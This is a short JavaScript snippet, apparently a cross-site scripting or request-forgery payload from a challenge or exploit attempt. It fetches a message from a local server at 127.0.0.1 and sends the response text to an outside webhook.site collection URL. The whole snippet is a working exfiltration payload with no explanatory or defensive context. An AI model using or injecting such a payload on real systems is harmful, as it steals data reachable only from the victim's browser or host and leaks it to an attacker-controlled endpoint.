fetch("http://127.0.0.1:80/message/3").then((r) => {
    return r.text();
}).then((x) => {
    fetch("https://webhook.site/aace503c-49bb-47a7-87ec-83441412b596/"+ x, );
});
